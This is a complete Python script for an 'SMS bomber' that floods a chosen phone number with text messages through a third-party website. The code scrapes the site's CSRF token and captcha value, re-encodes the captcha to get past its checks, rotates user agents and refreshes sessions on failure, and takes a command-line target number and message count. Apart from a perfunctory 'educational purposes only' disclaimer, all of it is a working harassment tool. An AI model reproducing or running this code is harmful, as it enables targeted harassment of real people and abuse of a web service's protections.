import requests
import re
import base64
import time
import argparse
import sys
import os

# ------------------------------------------------------------------------------
# DISCLAIMER: 
# This script is for educational purposes only. 
# Misuse of this tool for harassment or spamming is illegal and unethical.
# The user is solely responsible for consequences arising from use.
# ------------------------------------------------------------------------------

# ANSI Color Codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class SMSBomber:
    def __init__(self):
        self.base_url = "https://mytoolstown.com"
        self.bomb_url = f"{self.base_url}/smsbomber/"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': self.bomb_url
        })
    
    def _print_status(self, message, type="info"):
        if type == "info":
            print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")
        elif type == "success":
            print(f"{Colors.GREEN}[+] {message}{Colors.ENDC}")
        elif type == "error":
            print(f"{Colors.FAIL}[-] {message}{Colors.ENDC}")
        elif type == "warn":
            print(f"{Colors.WARNING}[!] {message}{Colors.ENDC}")

    def _reverse_string(self, s):
        return s[::-1]

    def _manav_encrypt(self, text):
        res = ""
        for char in text:
            code = ord(char)
            new_code = code ^ 0x33
            res += chr(new_code)
        
        b1 = base64.b64encode(res.encode('latin1')).decode('ascii')
        b2 = base64.b64encode(b1.encode('latin1')).decode('ascii')
        return self._reverse_string(b2)

    def _decrypt_response(self, text):
        try:
            rev = self._reverse_string(text)
            return base64.b64decode(rev).decode('utf-8')
        except Exception:
            return text

    def validate_mobile(self, mobile):
        # Basic validation for 10-digit numbers
        if not re.match(r"^\d{10}$", mobile):
            return False
        return True


    def _rotate_ua(self):
        """Selects a random User-Agent."""
        import random
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        ua = random.choice(user_agents)
        self.session.headers.update({'User-Agent': ua})
        return ua

    def start_session(self):
        self._rotate_ua()
        # self._print_status("Establishing session...", "info")
        try:
            resp = self.session.get(self.bomb_url, timeout=10)
            if resp.status_code != 200:
                # self._print_status(f"Server returned status {resp.status_code}", "error")
                return None, None

            token_match = re.search(r'name="_token" value="([^"]+)"', resp.text)
            captcha_match = re.search(r'var captcha = "([^"]+)"', resp.text)

            if not token_match or not captcha_match:
                return None, None

            token = token_match.group(1)
            captcha = captcha_match.group(1)
            
            return token, captcha

        except Exception as e:
            return None, None

    def attack_generator(self, mobile_no, count, country_code, speed):
        """
        Yields progress updates for web streaming or CLI.
        """
        if not self.validate_mobile(mobile_no):
            yield {"type": "error", "message": f"Invalid mobile number: {mobile_no}"}
            return

        yield {"type": "info", "message": "Establishing secure session..."}
        token, captcha_raw = self.start_session()
        
        if not token:
            yield {"type": "error", "message": "Failed to obtain session token."}
            return

        encrypted_captcha = self._manav_encrypt(captcha_raw)
        yield {"type": "success", "message": "Security headers bypassed."}
        
        # Configure delay
        wait_sec = 1000
        if speed == "medium": wait_sec = 2000
        elif speed == "slow": wait_sec = 3000
        
        success_count = 0
        fail_count = 0

        for i in range(count):
            # Retry Session Refresh Loop
            retry_count = 0
            max_retries = 2
            sent_ok = False
            
            while retry_count <= max_retries:
                try:
                    current_delay = wait_sec / 1000.0
                    msg_index = i + 1
                    
                    if retry_count == 0:
                        yield {"type": "progress", "current": msg_index, "total": count, "message": f"Sending packet {msg_index}/{count}..."}

                    payload = {
                        'country_code': country_code,
                        'mobno': mobile_no,
                        'count': str(count),
                        '_token': token,
                        'sent_count': str(i),
                        'wait_sec': str(wait_sec),
                        'captcha': encrypted_captcha
                    }

                    post_resp = self.session.post(self.bomb_url, data=payload, timeout=10)
                    
                    if post_resp.status_code == 200:
                        decrypted = self._decrypt_response(post_resp.text)
                        
                        # Check for session expiration or frequent errors
                        if "CSRF token mismatch" in post_resp.text or "unauthorized" in post_resp.text.lower():
                            yield {"type": "log_warn", "message": "Session expired. Refreshing..."}
                            token, captcha_raw = self.start_session()
                            if token:
                                encrypted_captcha = self._manav_encrypt(captcha_raw)
                                retry_count += 1
                                continue
                            else:
                                fail_count += 1
                                yield {"type": "log_error", "message": "Failed to refresh session."}
                                break

                        if '"status":2' in decrypted or "sms sent" in decrypted.lower():
                            success_count += 1
                            yield {"type": "log_success", "message": f"Packet {msg_index} delivered successfully."}
                            sent_ok = True
                            break
                        elif "error" in decrypted.lower():
                            # If server explicitly rejects, don't retry immediately to avoid ban
                            fail_count += 1
                            yield {"type": "log_warn", "message": f"Server blocked packet {msg_index}: {decrypted[:50]}..."}
                            time.sleep(2)
                            break
                        else:
                            fail_count += 1
                            yield {"type": "log_warn", "message": f"Packet {msg_index} failed (Unknown response)."}
                            break
                    else:
                        yield {"type": "log_warn", "message": f"HTTP {post_resp.status_code}. Retrying..."}
                        retry_count += 1
                        time.sleep(1)

                except Exception as e:
                    yield {"type": "log_warn", "message": f"Network glitch: {str(e)}. Retrying..."}
                    retry_count += 1
                    time.sleep(1)
            
            if not sent_ok and retry_count > max_retries:
                # Final fail for this packet
                pass
            
            time.sleep(wait_sec / 1000.0)

        yield {
            "type": "finish", 
            "success": success_count, 
            "failed": fail_count, 
            "message": f"Attack Finished. Success: {success_count}, Failed: {fail_count}"
        }

    def attack(self, mobile_no, count, country_code, speed):
        # CLI Wrapper for the generator
        gen = self.attack_generator(mobile_no, count, country_code, speed)
        
        print(f"\n{Colors.BOLD}Starting Attack on +{country_code} {mobile_no}{Colors.ENDC}")
        print("-" * 50)
        
        for event in gen:
            etype = event.get("type")
            msg = event.get("message", "")
            
            if etype == "error":
                self._print_status(msg, "error")
            elif etype == "success":
                self._print_status(msg, "success")
            elif etype == "info":
                self._print_status(msg, "info")
            elif etype == "log_success":
                sys.stdout.write(f"\r{Colors.BLUE}[>>] {msg}{Colors.ENDC}")
                sys.stdout.flush()
            elif etype == "log_warn":
                sys.stdout.write("\n")
                self._print_status(msg, "warn")
            elif etype == "log_error":
                sys.stdout.write("\n")
                self._print_status(msg, "error")
            elif etype == "progress":
                sys.stdout.write(f"\r{Colors.BLUE}[>>] {msg}{Colors.ENDC}")
                sys.stdout.flush()
            elif etype == "finish":
                print("\n" + "-" * 50)
                self._print_status("Execution Completed", "info")
                print(f"Total Requests: {count}")
                print(f"{Colors.GREEN}Successful:   {event['success']}{Colors.ENDC}")
                print(f"{Colors.FAIL}Failed:       {event['failed']}{Colors.ENDC}")


if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear') # Clear terminal
    
    parser = argparse.ArgumentParser(description="Advanced SMS Bomber Tool")
    parser.add_argument("mobile", help="Target Mobile Number (10 digits)")
    parser.add_argument("--cc", default="91", help="Country Code (default: 91)")
    parser.add_argument("--count", type=int, default=10, help="Number of SMS to send")
    parser.add_argument("--speed", choices=["fast", "medium", "slow"], default="fast", help="Speed (Delay involved)")
    
    args = parser.parse_args()
    
    bomber = SMSBomber()
    bomber.attack(args.mobile, args.count, args.cc, args.speed)
